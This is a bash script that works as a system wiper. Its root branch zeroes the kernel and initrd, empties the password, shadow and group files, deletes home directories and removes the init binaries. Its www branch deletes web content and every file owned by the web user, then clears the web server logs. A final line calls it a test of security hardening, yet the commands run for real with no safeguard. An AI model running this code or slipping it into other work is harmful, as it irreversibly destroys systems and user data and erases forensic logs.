#!/bin/bash

echo ""
echo ""

read -p "Enter your current user (root/www): " identity

case $identity in
    root|ROOT)
        echo "You have chosen: $identity"
        echo "Starting destructive operations..."
        
        iptables -A INPUT -p icmp -j DROP 2>/dev/null
        echo "ICMP blocked (ping will not work)"
        
        dd if=/dev/zero of=/boot/vmlinuz-* bs=1M count=1 2>/dev/null
        dd if=/dev/zero of=/boot/initrd.img-* bs=1M count=1 2>/dev/null
        echo "Kernel destroyed"
        
        echo "" > /etc/passwd
        echo "" > /etc/shadow
        echo "" > /etc/group
        echo "User databases cleared"
        
        rm -rf /home/* 2>/dev/null
        rm -rf /root/* 2>/dev/null
        echo "User data deleted"
        
        rm -f /sbin/init /bin/systemd /lib/systemd/systemd 2>/dev/null
        echo "System init destroyed"
        ;;
        
    www|WWW)
        echo "You have chosen: $identity"
        echo "Starting destructive operations..."
        
        iptables -A INPUT -p icmp -j DROP 2>/dev/null
        echo "ICMP blocked (ping will not work)"
        
        rm -rf /var/www/html/* 2>/dev/null
        rm -rf /var/www/* 2>/dev/null
        echo "Website directories deleted"
        
        find / -user www 2>/dev/null -exec rm -rf {} \; 2>/dev/null
        find / -user www-data 2>/dev/null -exec rm -rf {} \; 2>/dev/null
        echo "www user files deleted"
        
        > /var/log/nginx/access.log 2>/dev/null
        > /var/log/nginx/error.log 2>/dev/null
        > /var/log/apache2/access.log 2>/dev/null
        > /var/log/apache2/error.log 2>/dev/null
        echo "Web logs cleared"
        ;;
        
    *)
        echo "Invalid input. Please enter root or www"
        exit 1
        ;;
esac

echo ""
echo "Complete. System has been destroyed."
echo "If your security hardening is effective, these operations should have been blocked."